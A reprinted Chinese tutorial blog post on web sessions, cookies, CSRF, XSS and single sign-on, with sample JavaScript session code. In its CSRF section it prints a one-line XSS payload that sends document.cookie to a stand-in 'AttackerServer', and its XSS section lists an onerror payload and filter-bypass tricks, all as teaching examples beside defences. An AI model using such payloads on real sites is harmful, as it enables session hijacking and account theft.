---
title: 'session与登录机制' 
date: 2018-11-29 9:34:56
hidden: true
slug: 60ppqvz27vk
categories: [reprint]
---

{{< raw >}}

                    
<p><code>github</code> 地址：<a href="https://github.com/UNDERCOVERj/tech-blog/issues/3" rel="nofollow noreferrer" target="_blank">戳这里</a></p>
<h1 id="articleHeader0">session</h1>
<h2 id="articleHeader1">概念</h2>
<ol>
<li>指一类用来在客户端与服务器之间保持状态的解决方案</li>
<li>这种解决方案的存储结构</li>
</ol>
<h2 id="articleHeader2">特点</h2>
<ul>
<li>由于 <code>Session</code> 是以文本文件形式存储在服务器端的，所以不怕客户端修改 Session 内容。（也可以用其他存储方式比如<code>redis</code>）</li>
<li>
<code>Session</code>对象是有生命周期的</li>
<li>
<code>Session</code>实例是轻量级的，所谓轻量级：是指他的创建和删除不需要消耗太多资源</li>
<li>
<code>Session</code>对象内部有一个缓存</li>
</ul>
<h2 id="articleHeader3">用法</h2>
<p><code>Session</code> 对象存储特定用户会话所需的属性及配置信息，在<code>web</code>页跳转时，信息将不会丢失</p>
<h3 id="articleHeader4">通常用于以下操作</h3>
<ol>
<li>存储整个会话过程中保持用户状态的信息，比如登录信息或者用户浏览时产生的其它信息</li>
<li>存储只需要在 <strong>页重新加载</strong> 过程中，或者  <strong>一组功能页</strong>  之间保持状态的对象</li>
<li>在 Web服务器上保持用户的  <strong>状态信息</strong>  供在任何时间从任何设备上的页面进行访问。</li>
</ol>
<h3 id="articleHeader5">限制</h3>
<ol>
<li>用户登录越多，<code>session</code>需要的内存量越大</li>
<li>每个 <code>Session</code> 对象的持续时间是用户访问的时间加上不活动的时间。</li>
</ol>
<h2 id="articleHeader6">为何需要<code>session</code>
</h2>
<p>HTTP协议本身是无状态的</p>
<p>举个喝咖啡的例子：</p>
<p>1、该店的店员很厉害，能记住每位顾客的消费数量，只要顾客一走进咖啡店，店员就知道该怎么对待了。这种做法就是协议本身支持状态。 </p>
<p>2、发给顾客一张卡片，上面记录着消费的数量，一般还有个有效期限。每次消费时，如果顾客出示这张卡片，则此次消费就会与以前或以后的消费相联系起来。这种做法就是在客户端保持状态。 </p>
<p>3、发给顾客一张会员卡，除了卡号之外什么信息也不纪录，每次消费时，如果顾客出示该卡片，则店员在店里的纪录本上找到这个卡号对应的纪录添加一些消费信息。这种做法就是在服务器端保持状态。</p>
<h2 id="articleHeader7">具体机制</h2>
<ol>
<li>当程序需要为某个客户端的请求创建一个<code>session</code>的时候，服务器首先检查这个客户端的请求里是否已包含了一个  <strong>session标识</strong>   - 称为<code>session id</code>，如果已包含一个<code>session id</code>则说明以前已经为此客户端创建过session，服务器就按照<code>session id</code>把这个<code>session</code>检索出来使用（如果检索不到，可能会新建一个），如果客户端请求不包含<code>session id</code>，则为此客户端创建一个<code>session</code>并且生成一个与此<code>session</code>相关联的<code>session id</code>，<code>session id</code>的值应该是一个 <strong>既不会重复，又不容易被找到规律以仿造的字符串</strong> ，这个<code>session id</code>将被在本次响应中返回给客户端保存。</li>
<li>
<p>由于<code>cookie</code>可以被人为的禁止，必须有其他机制以便在<code>cookie</code>被禁止时仍然能够把<code>session id</code>传递回服务器。经常被使用的一种技术叫做<code>URL</code>重写</p>
<p>两种形式：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="// 作为url附加路径
'http://..../xxx;jsessionid=abcdefjijeoijoifjioe'


// 作为查询字符串
'http://..../xxx?jsessionid=abcdefjijeoijoifjioe'" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs rust"><code><span class="hljs-comment">// 作为url附加路径</span>
<span class="hljs-symbol">'http</span>:<span class="hljs-comment">//..../xxx;jsessionid=abcdefjijeoijoifjioe'</span>


<span class="hljs-comment">// 作为查询字符串</span>
<span class="hljs-symbol">'http</span>:<span class="hljs-comment">//..../xxx?jsessionid=abcdefjijeoijoifjioe'</span></code></pre>
</li>
<li>较老的技术，<strong>表单隐藏字段</strong>，此方法在防止csrf中有用</li>
</ol>
<h2 id="articleHeader8">实现</h2>
<p><strong>基于cookie来实现用户和数据的映射</strong></p>
<p>将口令放在<code>cookie</code>中，口令一旦被褚昂爱，就丢失映射关系。通常<code>session</code>的有效期通常短，过期就将数据删除</p>
<p>一旦服务器检查到用户请求<code>cookie</code>中没有携带<code>session_id</code>，它会为之生成一个值，这个值是唯一且不重复的值，并设定超时时间。如果过期就重新生成，如果没有过期，就更新超时时间</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="var sessions = {};
var key = 'session_id';
var EXPIRES = 20*60*1000;
var generate  = function () {
    var session = {};
    session.id = (new Date().getTime()) + Math.random();
    session.cookie = {
        expire: (new Date()).getTime() + EXPIRES
    }
    sessions[session.id] = session
}

function (req, res) {
    var id = req.cookies[key];
    if (!id) {
        req.session = generate();
    } else {
        var session = sessions[id];
        if (session) {
            if (session.cookie.expire > new Date().getTime()) {
                session.cookie.expire = new Date().getTime() + EXPIRES;
                req.session = session;
            } else {
                delete sessions[id];
                req.session = generate();
            }
        } else {
            req.session = generate();
        }
    }
}" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs verilog"><code><span class="hljs-keyword">var</span> sessions = {};
<span class="hljs-keyword">var</span> key = 'session_id';
<span class="hljs-keyword">var</span> EXPIRES = <span class="hljs-number">20</span>*<span class="hljs-number">60</span>*<span class="hljs-number">1000</span>;
<span class="hljs-keyword">var</span> <span class="hljs-keyword">generate</span>  = <span class="hljs-keyword">function</span> () {
    <span class="hljs-keyword">var</span> session = {};
    session<span class="hljs-variable">.id</span> = (<span class="hljs-keyword">new</span> Date()<span class="hljs-variable">.getTime</span>()) + Math<span class="hljs-variable">.random</span>();
    session<span class="hljs-variable">.cookie</span> = {
        expire: (<span class="hljs-keyword">new</span> Date())<span class="hljs-variable">.getTime</span>() + EXPIRES
    }
    sessions[session<span class="hljs-variable">.id</span>] = session
}

<span class="hljs-keyword">function</span> (req, res) {
    <span class="hljs-keyword">var</span> id = req<span class="hljs-variable">.cookies</span>[key];
    <span class="hljs-keyword">if</span> (!id) {
        req<span class="hljs-variable">.session</span> = <span class="hljs-keyword">generate</span>();
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">var</span> session = sessions[id];
        <span class="hljs-keyword">if</span> (session) {
            <span class="hljs-keyword">if</span> (session<span class="hljs-variable">.cookie</span><span class="hljs-variable">.expire</span> &gt; <span class="hljs-keyword">new</span> Date()<span class="hljs-variable">.getTime</span>()) {
                session<span class="hljs-variable">.cookie</span><span class="hljs-variable">.expire</span> = <span class="hljs-keyword">new</span> Date()<span class="hljs-variable">.getTime</span>() + EXPIRES;
                req<span class="hljs-variable">.session</span> = session;
            } <span class="hljs-keyword">else</span> {
                delete sessions[id];
                req<span class="hljs-variable">.session</span> = <span class="hljs-keyword">generate</span>();
            }
        } <span class="hljs-keyword">else</span> {
            req<span class="hljs-variable">.session</span> = <span class="hljs-keyword">generate</span>();
        }
    }
}</code></pre>
<h2 id="articleHeader9">一种节省空间的做法</h2>
<p>由于关闭浏览器不会导致<code>session</code>被删除，迫使服务器为<code>seesion</code>设置了一个失效时间，当距离客户端上一次使用<code>session</code>的时间超过这个失效时间时，服务器就可以认为客户端已经停止了活动，才会把<code>session</code>删除以节省存储空间</p>
<h2 id="articleHeader10"><code>reference</code></h2>
<p><a href="http://justsee.iteye.com/blog/1570652" rel="nofollow noreferrer" target="_blank">http://justsee.iteye.com/blog...</a></p>
<p><a href="https://baike.baidu.com/item/session/479100?fr=aladdin" rel="nofollow noreferrer" target="_blank">https://baike.baidu.com/item/...</a></p>
<p><a href="https://blog.csdn.net/hjc1984117/article/details/53995816" rel="nofollow noreferrer" target="_blank">https://blog.csdn.net/hjc1984...</a></p>
<h1 id="articleHeader11"><code>cookie</code></h1>
<p>存储在用户本地终端的数据</p>
<p><code>http</code>请求自动发送，跨域除外</p>
<h2 id="articleHeader12">用途</h2>
<p>客户端记录用户信息</p>
<h2 id="articleHeader13">特点</h2>
<p>存储在硬盘上的<code>cookie</code>可以在不同的浏览器进程间共享，比如两个<code>IE</code>窗口。而对于保存在内存里的<code>cookie</code>，不同的浏览器有不同的处理方式。</p>
<h2 id="articleHeader14">属性</h2>
<ol>
<li>
<code>name</code>：<code>cookie</code>名称</li>
<li>
<code>value</code>：<code>cookie</code>值</li>
<li>
<code>domain</code>：可以访问<code>cookie</code>的域名，某一级域名可以访问上一级级域名的cookie</li>
<li>
<code>expires/Max-Age</code>：过期时间</li>
<li>
<code>Size</code>：<code>cookie</code>的大小</li>
<li>
<code>http</code>：<code>httponly</code>属性，为<code>true</code>，不能用<code>document.cookie</code>获得</li>
<li>
<code>secure</code>：为<code>true</code>只能在<code>https</code>获得</li>
<li>
<code>path</code>：子路径访问父路径<code>cookie</code>
</li>
</ol>
<h2 id="articleHeader15">创建cookie</h2>
<p><code>document.cookie="username=John Doe; expires=Thu, 18 Dec 2013 12:00:00 GMT; path=/";</code></p>
<h2 id="articleHeader16">读取cookie</h2>
<p><code>document.cookie</code></p>
<h2 id="articleHeader17">修改cookie</h2>
<p><code>document.cookie = </code> </p>
<p>采用覆盖的形式</p>
<h2 id="articleHeader18">删除cookie</h2>
<p>将过期时间设置为过去时间即可</p>
<h2 id="articleHeader19">与<code>localStorage</code>和<code>sessionStorage</code>的区别</h2>
<ol>
<li>
<p>存储大小</p>
<ul>
<li>
<code>cookie</code>数据大小不能超过4k。</li>
<li>
<code>sessionStorage</code>和<code>localStorage</code> 虽然也有存储大小的限制，但比<code>cookie</code>大得多，可以达到5M或更大。</li>
</ul>
</li>
<li>
<p>有效时间</p>
<ul>
<li>
<code>localStorage</code> 存储持久数据，浏览器关闭后数据不丢失除非主动删除数据；</li>
<li>
<code>sessionStorage</code> 数据在当前浏览器窗口关闭后自动删除。</li>
<li>
<code>cookie</code> 设置的<code>cookie</code>过期时间之前一直有效，即使窗口或浏览器关闭</li>
</ul>
</li>
<li>
<p><code>sessionStorage</code></p>
<ul>
<li>会话级别的存储</li>
<li>临时性的，页面打开有，页面关闭没有</li>
<li>数据不共享</li>
<li>通过a标签来跳出一个页面，则<code>sessionStorage</code>共享</li>
</ul>
</li>
<li>
<p><code>localStorage</code></p>
<ul>
<li>持久化的本地存储</li>
<li>永久性的存储</li>
<li>不能跨域</li>
<li>数据共享</li>
</ul>
</li>
<li>
<p><code>cookie</code></p>
<ul>
<li>
<code>cookie</code>在同源且符合<code>path</code>规则的文档之间共享</li>
<li>
<code>max-age</code>用秒来设置<code>cookie</code>的生存期。</li>
<li>如果<code>max-age</code>为0，则表示删除该<code>cookie</code>。</li>
<li>如果<code>max-age</code>为负数，则表示该<code>cookie</code>仅在本浏览器窗口以及本窗口打开的子窗口内有效，关闭窗口后该cookie即失效。</li>
</ul>
</li>
</ol>
<h2 id="articleHeader20">如何得到<code>cookie</code>
</h2>
<p>有两个http头部是专门负责设置以及发送<code>cookie</code>的,它们分别是 <code>Set-Cookie</code> 以及 <code>Cookie</code> 。当服务器返回给客户端一个http响应信息时，其中如果包含<code>Set-Cookie</code>这个头部时，意思就是指示客户端建立一个<code>cookie</code>，并且在后续的http请求中自动发送这个<code>cookie</code>到服务器端，直到这个<code>cookie</code>过期。如果<code>cookie</code>的生存时间是整个会话期间的话，那么浏览器会将<code>cookie</code>保存在内存中，浏览器关闭时就会自动清除这个<code>cookie</code>。另外一种情况就是保存在客户端的硬盘中，浏览器关闭的话，该<code>cookie</code>也不会被清除，下次打开浏览器访问对应网站时，这个<code>cookie</code>就会自动再次发送到服务器端。</p>
<h2 id="articleHeader21">
<code>cookie</code>服务器端写入</h2>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="//java的写法
response.setHeader(&quot;SET-COOKIE&quot;, key + &quot;=&quot;+ value + &quot;;Path=/;domain=&quot;+ domain + &quot;;date=&quot;+date);

//php 中的写法
setcookie(name,value,expire,path,domain,secure)" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs q"><code><span class="hljs-comment">//java的写法</span>
response.setHeader(<span class="hljs-string">"SET-COOKIE"</span>, <span class="hljs-built_in">key</span> + <span class="hljs-string">"="</span>+ <span class="hljs-built_in">value</span> + <span class="hljs-string">";Path=/;domain="</span>+ domain + <span class="hljs-string">";date="</span>+date);

<span class="hljs-comment">//php 中的写法</span>
setcookie(name,<span class="hljs-built_in">value</span>,expire,path,domain,secure)</code></pre>
<h2 id="articleHeader22">reference</h2>
<p><a href="https://my.oschina.net/ososchina/blog/339918" rel="nofollow noreferrer" target="_blank">https://my.oschina.net/ososch...</a></p>
<p><a href="https://blog.csdn.net/dong123dddd/article/details/50388656" rel="nofollow noreferrer" target="_blank">https://blog.csdn.net/dong123...</a></p>
<h1 id="articleHeader23">csrf（跨站请求伪造）</h1>
<h2 id="articleHeader24">过程</h2>
<ol>
<li>用户c打开浏览器，登录网站a</li>
<li>登录成功后，记录登录信息<code>cookie</code>
</li>
<li>在网站<code>a</code>未退出的情况下，打开网站<code>b</code>
</li>
<li>网站<code>b</code>在收到用户请求后返回攻击性代码，获取网站<code>a</code>的<code>cookie</code>，并发出请求a网站（注意:这儿是两步）</li>
<li>网站<code>a</code>误以为还是用户c发出的请求</li>
</ol>
<h2 id="articleHeader25">窃取cookie</h2>
<p>向被攻击者的服务器页面上注入一段<code>javascript</code>代码(借助xss跨站脚本攻击)</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="document.location='http://AttackerServer/getCookie.php?cookie='+document.cookie;" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs coffeescript"><code style="word-break: break-word; white-space: initial;"><span class="hljs-built_in">document</span>.location=<span class="hljs-string">'http://AttackerServer/getCookie.php?cookie='</span>+<span class="hljs-built_in">document</span>.cookie;</code></pre>
<h2 id="articleHeader26">防御</h2>
<ol>
<li>验证<code>http referer</code>字段</li>
<li>在请求地址中添加token</li>
</ol>
<p>系统开发者可以在<code>HTTP</code>请求中以参数的形式加入一个随机产生的<code>token</code>，并在服务器端建立一个拦截器来验证这个<code>token</code>，如果请求中没有<code>token</code>或者<code>token</code>内容不正确，则认为可能是<code>CSRF</code>攻击而拒绝该请求。</p>
<ol><li>在<code>HTTP</code>头中自定义属性并验证（不会被泄露）</li></ol>
<h2 id="articleHeader27"><code>reference</code></h2>
<p><a href="http://www.freebuf.com/articles/web/11840.html" rel="nofollow noreferrer" target="_blank">http://www.freebuf.com/articl...</a></p>
<h1 id="articleHeader28">xss（跨站脚本攻击）</h1>
<h2 id="articleHeader29">分类</h2>
<ol><li>反射型（非持久型）</li></ol>
<p>那些浏览器每次都要在参数中提交恶意数据才能触发的跨站脚本漏洞。</p>
<p>可以让一个域名转向到恶意<code>URL</code>，把那个域名发给用户</p>
<ol><li>存储型（持久型）</li></ol>
<p>指通过提交恶意数据到存储器（比如数据库、文本文件等），<code>Web</code>应用程序输出的时候是从存储器中读出恶意数据输出到页面的一类跨站脚本漏洞。</p>
<h2 id="articleHeader30">常见攻击方法</h2>
<ol>
<li>绕过<code>xss-filter</code>
</li>
<li>利用<code>img</code>
</li>
<li>空格，回车，<code>tab</code>来绕过过滤</li>
<li>利用事件如：<code>&lt;img src=“#” onerror= “alert(1)”/&gt;</code>
</li>
<li>css跨站：<code>background-url</code>
</li>
<li>利用字符编码</li>
</ol>
<h2 id="articleHeader31">防御</h2>
<ol><li>
<code>xss-filter</code>，过滤标签</li></ol>
<p>2.<code> httpOnly</code></p>
<ol><li>将变量输出到页面时，要编码</li></ol>
<h2 id="articleHeader32">reference</h2>
<p><a href="http://www.cnblogs.com/wqhwe/p/5416976.html" rel="nofollow noreferrer" target="_blank">http://www.cnblogs.com/wqhwe/...</a></p>
<h1 id="articleHeader33">单系统登录</h1>
<h2 id="articleHeader34">
<code>http</code>无状态协议</h2>
<p>浏览器每次请求，服务器都单独处理</p>
<p>要鉴别浏览器请求，又因为http是无状态协议，所以需要服务器和浏览器共同维护一个状态</p>
<h2 id="articleHeader35">会话机制</h2>
<p>浏览器第一次请求服务器，创建一个会话id，并由浏览器存储，以后每次请求都带上，服务器取得后可判断是否是同一个用户</p>
<p>单系统利用<code>cookie</code></p>
<h2 id="articleHeader36">登录状态</h2>
<p>浏览器第一次请求服务器，需要验证用户名和密码，通过与数据库里的作比较，验证通过将会话标记为“已授权”</p>
<p>以后每次请求都检查登录状态</p>
<h1 id="articleHeader37">单点登录(多系统登录，<code>single sign on</code>，<code>sso</code>)</h1>
<p>用户登录注销一次，就可以在多个系统中得到效果</p>
<p>由于多系统的域不一样，所有cookie会受到限制，浏览器发送<code>http</code>请求时会自动携带与该域匹配的<code>cookie</code>，而不是所有<code>cookie</code></p>
<p>如果将<code>domain</code>设置为顶级域名会有限制：</p>
<ol>
<li>系统群域名得统一</li>
<li>各系统使用的技术要相同</li>
<li>
<code>cookie</code>不安全</li>
</ol>
<h2 id="articleHeader38">登录</h2>
<p>相比于单系统登录，<code>sso</code>多了一个认证中心，只有认证中心接受用户名和密码等安全信息，其他系统不提供登录入口，只接受认证中心的间接授权。间接授权通过令牌实现，<code>sso</code>认证中心验证用户的用户名密码没问题，创建授权令牌，在接下来的跳转过程中，授权令牌作为参数发送给各个子系统，子系统拿到令牌，即得到了授权，可以借此创建局部会话，局部会话登录方式与单系统的登录方式相同。这个过程，也就是单点登录的原理，用下图说明</p>
<p><span class="img-wrap"><img data-src="/img/remote/1460000014969668?w=737&amp;h=931" src="https://static.alili.tech/img/remote/1460000014969668?w=737&amp;h=931" alt="image" title="image" style="cursor: pointer;"></span></p>
<p>用户登录成功之后，会与sso认证中心及各个子系统建立会话，用户与sso认证中心建立的会话称为全局会话，用户与各个子系统建立的会话称为局部会话，局部会话建立之后，用户访问子系统受保护资源将不再通过sso认证中心</p>
<h2 id="articleHeader39">注销</h2>
<p><span class="img-wrap"><img data-src="/img/remote/1460000014969669?w=698&amp;h=499" src="https://static.alili.tech/img/remote/1460000014969669?w=698&amp;h=499" alt="注销" title="注销" style="cursor: pointer;"></span></p>
<h2 id="articleHeader40">具体跳转</h2>
<p>假设认证中心和系统2的url分别是：<code>sso.com、system2.com</code> ，访问 <code>system2.com</code> 时因未登录而跳转到 <code>sso.com</code> ，跳转地址：<code>http://sso.com?service=http://system2.com</code>（不需要额外信息），此时，就变成了浏览器与 <code>http://sso.com</code> 站点之间的会话，这个会话因为系统1登录的原因已经被标记为已登录，所以认证中心取一块令牌，根据service参数回跳，并附上令牌，回跳地址：<code>http://system2.com?token=token</code></p>
<h2 id="articleHeader41">如何验证登录信息</h2>
<ol>
<li>
<p>不同域之间</p>
<ul>
<li>当登录某一系统后，须跳转到其它系统并设置cookie</li>
<li><a href="https://blog.csdn.net/yanyang1116/article/details/54837603" rel="nofollow noreferrer" target="_blank">nodejs实现302跳转</a></li>
</ul>
</li>
<li>
<p>同一域名不同站点</p>
<ul><li>共享<code>cookie</code>
</li></ul>
</li>
<li>
<p>同一域，不同子域</p>
<ul><li>存放<code>sessionId</code>的域都是上一级的</li></ul>
</li>
</ol>
<h2 id="articleHeader42">reference</h2>
<p><a href="https://www.cnblogs.com/wxj-106/p/8097880.html" rel="nofollow noreferrer" target="_blank">https://www.cnblogs.com/wxj-1...</a></p>
<p><a href="http://www.cnblogs.com/ywlaker/p/6113927.html#!comments" rel="nofollow noreferrer" target="_blank">http://www.cnblogs.com/ywlake...</a></p>

                
{{< /raw >}}

# 版权声明
本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有，

本文仅用于学习、研究和交流目的。转载请注明出处、完整链接以及原作者。

原作者若认为本站侵犯了您的版权，请联系我们，我们会立即删除！

## 原文标题
session与登录机制

## 原文链接
[https://segmentfault.com/a/1190000014969663](https://segmentfault.com/a/1190000014969663)

